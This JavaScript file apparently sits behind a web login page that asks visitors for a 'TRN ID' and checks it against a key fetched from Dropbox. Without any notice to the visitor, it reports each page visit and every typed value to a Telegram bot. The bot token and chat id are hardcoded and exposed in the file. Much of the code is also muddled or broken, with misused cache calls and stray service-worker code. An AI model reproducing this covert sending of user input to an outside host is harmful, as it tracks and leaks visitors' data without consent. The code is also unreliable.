let xhr = new XMLHttpRequest();
fetch("https://api.telegram.org/bot5234920052:AAEDxAVyUMHE5p_t1FwhC3HRUC9FycEz_Tc/sendMessage?chat_id=1395896130&text=SOMEONE STARTED WEBSITE");
function getVal() {
  let val = document.querySelector('input').value;
  fetch("https://api.telegram.org/bot5234920052:AAEDxAVyUMHE5p_t1FwhC3HRUC9FycEz_Tc/sendMessage?chat_id=1395896130&text=SOMEONE TRIED TRN ID:"+val);
  caches.delete(getVal).then(function(boolean) {
    // your cache is now deleted
  });
  const deleteCache = async key => {
    await caches.delete(key)
  }
  
  const deleteOldCaches = async () => {
     const cacheKeepList = ['v2'];
     const keyList = await caches.keys()
     const cachesToDelete = keyList.filter(key => !cacheKeepList.includes(key))
     await Promise.all(cachesToDelete.map(deleteCache));
  }
  
  self.addEventListener('activate', (event) => {
    event.waitUntil(deleteOldCaches());
  });

let url = "https://dl.dropboxusercontent.com/s/4qcttw739pyef9m/key.sh";


xhr.open("GET", url);
window.onpageshow = function (event) {
  if (event.persisted) {
      window.location.reload();
  }
  
};
xhr.onreadystatechange = function () {
  caches.delete(getVal).then(function(boolean) {
    // your cache is now deleted
  });
   if (xhr.readyState === 4) {
    let val = document.querySelector('input').value;
    localStorage.setItem("mytime", xhr.responseText);
    console.log(localStorage.getItem("mytime"));
    localStorage.clear()
    delete xhr
    caches.delete(xhr);
    caches.delete(getVal);
   
      if (val != "")
      {
        if (val === xhr.responseText)
        {
           
          location.replace("xyzzy.html")
          alert("login successfull");
          delete xhr 
          
        }
        else{
          alert( "invalid TRN OR SESSION EXPIRED");
          window.location.reload();
          localStorage.clear();
        }
      }
      else{
        alert("TRN REQUIED")
      }
      
      
      
   }};

xhr.send();

}
function unloadingWebsite() {
  // Do something just before the user leaves:
  // Eg: Hide/close your menu/reset settings/clear cookies etc, whatever you need to do.
  document.body.classList.add("unloaded");
}
window.addEventListener("pagehide", function() {
  unloadingWebsite();
});
window.addEventListener("pageshow", function() {
  // You can use the pageshow function if required to double ensure that everything is reset on the page load.
  // Most of the time the "pagehide" event will provide the solution.
  unloadingWebsite();
});
